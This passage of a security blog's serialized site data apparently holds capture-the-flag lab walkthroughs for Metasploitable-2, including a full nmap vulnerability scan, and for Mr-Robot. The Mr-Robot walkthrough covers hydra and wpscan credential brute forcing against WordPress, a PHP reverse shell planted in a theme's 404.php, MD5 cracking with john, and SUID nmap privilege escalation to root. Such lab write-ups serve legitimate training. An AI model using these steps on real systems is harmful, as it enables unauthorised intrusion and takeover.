__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308017931.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method4cve-2012-1823\&quot;&gt;Method4:CVE-2012-1823&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method4cve-2012-1823\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308052350.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308066038.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNeed privilege escalaion again&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;┌──(kali㉿kali)-[~]\n└─$ nmap —script vuln 192.168.124.32 -p-&lt;br&gt;\nStarting Nmap 7.92 ( &lt;a href=\&quot;https://nmap.org\&quot;&gt;https://nmap.org&lt;/a&gt; ) at 2022-11-03 21:54 EDT\nNmap scan report for bogon (192.168.124.32)\nHost is up (0.0020s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n| ftp-vsftpd-backdoor:\n|   VULNERABLE:\n|   vsFTPd version 2.3.4 backdoor\n|     State: VULNERABLE (Exploitable)\n|     IDs:  BID:48539  CVE:CVE-2011-2523\n|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.\n|     Disclosure date: 2011-07-03\n|     Exploit results:\n|       Shell command: id\n|       Results: uid=0(root) gid=0(root)\n|     References:\n|       &lt;a href=\&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\&quot;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb&lt;/a&gt;\n|       &lt;a href=\&quot;http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\&quot;&gt;http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523&lt;/a&gt;\n|_      &lt;a href=\&quot;https://www.securityfocus.com/bid/48539\&quot;&gt;https://www.securityfocus.com/bid/48539&lt;/a&gt;\n22/tcp    open  ssh\n23/tcp    open  telnet\n25/tcp    open  smtp\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|_      &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|&lt;em&gt;sslv2-drown: ERROR: Script execution failed (use -d to debug)\n| smtp-vuln-cve2010-4344:\n|&lt;/em&gt;  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params:\n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|       &lt;a href=\&quot;https://www.ietf.org/rfc/rfc2246.txt\&quot;&gt;https://www.ietf.org/rfc/rfc2246.txt&lt;/a&gt;\n|&lt;br&gt;\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n53/tcp    open  domain\n80/tcp    open  http\n| http-enum:\n|   /tikiwiki/: Tikiwiki\n|   /test/: Test page\n|   /phpinfo.php: Possible information file\n|   /phpMyAdmin/: phpMyAdmin\n|   /doc/: Potentially interesting directory w/ listing on ‘apache/2.2.8 (ubuntu) dav/2’\n|   /icons/: Potentially interesting folder w/ directory listing\n|_  /index/: Potentially interesting folder\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n|&lt;em&gt;http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|&lt;em&gt;http-phpself-xss: ERROR: Script execution failed (use -d to debug)\n|&lt;em&gt;http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n512/tcp   open  exec\n513/tcp   open  login\n514/tcp   open  shell\n1099/tcp  open  rmiregistry\n| rmi-vuln-classloader:\n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n|&lt;br&gt;\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb\&quot;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb&lt;/a&gt;\n1524/tcp  open  ingreslock\n2049/tcp  open  nfs\n2121/tcp  open  ccproxy-ftp\n3306/tcp  open  mysql\n|&lt;em&gt;ssl-ccs-injection: No reply from server (TIMEOUT)\n3632/tcp  open  distccd\n| distcc-cve2004-2687:\n|   VULNERABLE:\n|   distcc Daemon Command Execution\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2004-2687\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|       Allows executing of arbitrary commands on systems running distccd 3.1 and\n|       earlier. The vulnerability is the consequence of weak service configuration.\n|&lt;br&gt;\n|     Disclosure date: 2002-02-01\n|     Extra information:\n|&lt;br&gt;\n|     uid=1(daemon) gid=1(daemon) groups=1(daemon)\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687&lt;/a&gt;\n|       &lt;a href=\&quot;https://nvd.nist.gov/vuln/detail/CVE-2004-2687\&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2004-2687&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://distcc.github.io/security.html\&quot;&gt;https://distcc.github.io/security.html&lt;/a&gt;\n5432/tcp  open  postgresql\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n| ssl-dh-params:\n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n5900/tcp  open  vnc\n6000/tcp  open  X11\n6667/tcp  open  irc\n| irc-botnet-channels:\n|&lt;/em&gt;  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email &lt;a href=\&quot;mailto:admin@Metasploitable.LAN\&quot;&gt;admin@Metasploitable.LAN&lt;/a&gt; for more information.\n6697/tcp  open  ircs-u\n| irc-botnet-channels:\n|&lt;/em&gt;  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email &lt;a href=\&quot;mailto:admin@Metasploitable.LAN\&quot;&gt;admin@Metasploitable.LAN&lt;/a&gt; for more information.\n|&lt;em&gt;ssl-ccs-injection: No reply from server (TIMEOUT)\n8009/tcp  open  ajp13\n8180/tcp  open  unknown\n| http-slowloris-check:\n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server’s resources causing Denial Of Service.\n|&lt;br&gt;\n|     Disclosure date: 2009-09-17\n|     References:\n|       &lt;a href=\&quot;http://ha.ckers.org/slowloris/\&quot;&gt;http://ha.ckers.org/slowloris/&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750&lt;/a&gt;\n| http-enum:\n|   /admin/: Possible admin folder\n|   /admin/index.html: Possible admin folder\n|   /admin/login.html: Possible admin folder\n|   /admin/admin.html: Possible admin folder\n|   /admin/account.html: Possible admin folder\n|   /admin/admin_login.html: Possible admin folder\n|   /admin/home.html: Possible admin folder\n|   /admin/admin-login.html: Possible admin folder\n|   /admin/adminLogin.html: Possible admin folder\n|   /admin/controlpanel.html: Possible admin folder\n|   /admin/cp.html: Possible admin folder\n|   /admin/index.jsp: Possible admin folder\n|   /admin/login.jsp: Possible admin folder\n|   /admin/admin.jsp: Possible admin folder\n|   /admin/home.jsp: Possible admin folder\n|   /admin/controlpanel.jsp: Possible admin folder\n|   /admin/admin-login.jsp: Possible admin folder\n|   /admin/cp.jsp: Possible admin folder\n|   /admin/account.jsp: Possible admin folder\n|   /admin/admin_login.jsp: Possible admin folder\n|   /admin/adminLogin.jsp: Possible admin folder\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload\n|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload\n|   /admin/jscript/upload.html: Lizard Cart/Remote File upload\n|_  /webdav/: Potentially interesting folder\n8787/tcp  open  msgsrvr\n38316/tcp open  unknown\n44372/tcp open  unknown\n50889/tcp open  unknown\n55138/tcp open  unknown&lt;/p&gt;\n&lt;p&gt;Host script results:\n|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false&lt;/p&gt;\n&lt;p&gt;Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;mehod1cve-2007-2447&quot;],&quot;text&quot;:[0,&quot;Mehod1:CVE-2007-2447&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method2cve-2011-2523&quot;],&quot;text&quot;:[0,&quot;Method2:CVE-2011-2523&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method3:CVE-2004-2687&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method4cve-2012-1823&quot;],&quot;text&quot;:[0,&quot;Method4:CVE-2012-1823&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-2&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/11&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/mr-robot&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -sV -O -Pn -T4 192.168.124.80 -p-\nnmap --script vuln 192.168.124.80 -p-\ndirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt\n```\nFound login page\n![](img/1675935901724.PNG)\nThe wordlist of fsocity.dic\n![](img/1675935906897.PNG)\n\nThe first key\n\n![](img/1675935911648.PNG)\n***\n# Method-1\n## Exploit wordpress\nsort and uniq\n```\nsort fsocity.dic | uniq &gt; fsocity-sort.dic\n```\nHydra enumerate users\n```\nhydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username\&quot;\n```\n![](img/1675935995098.PNG)\n\nWpscan intrude users and password\n```\nwpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic\n```\n![](img/1675936001210.PNG)\n\n[Valid Combinations Found:\n Username: Elliot, Password: ER28-0652\nLogin in wordpress\n***\n## Getshell\nVisit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n![](img/1675936011245.png)\n\n\nlisten port 1234 on kali.\nThen  visit any pay which  not exists.\n`nc -lvnp 1234`\n![](img/1675936061435.PNG)\n\n\nFound another user robot and its file\n![](img/1675936067906.PNG)\n\nDecode password\nWrite &#39;c3fcd3d76192e4007dfb496cca67e13b&#39; into hash.txt\n```\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\n```\n![](img/1675936335560.PNG)\nTurn to user robot\n```\npython -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \nsu robot\n```\n![](img/1675936356620.PNG)\n\n\n***\n## Privilege escalation\nTry to escalate privilege through suid\nFind all the suid file.\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null\n```\n![](img/1675936394011.png)\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21\n```\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n![](img/1675936402754.PNG)\n`cat /root/key-3-of-3.txt`\n\n\n***\n# Enclosure\n\n![](img/1675935870791.PNG)\n\n![](img/1675935877529.png)\n\n![](img/1675935887078.PNG)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Mr-Robot.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;digest&quot;:[0,&quot;f948ce3104c70e88&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV -O -Pn -T4 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Found login page\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935901724.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe wordlist of fsocity.dic\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935906897.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;The first key&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935911648.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;exploit-wordpress\&quot;&gt;Exploit wordpress&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploit-wordpress\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;sort and uniq&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sort fsocity.dic | uniq &gt; fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Hydra enumerate users&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;#x26;pwd=^PASS^&amp;#x26;wp-submit=Log In:Invalid username\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 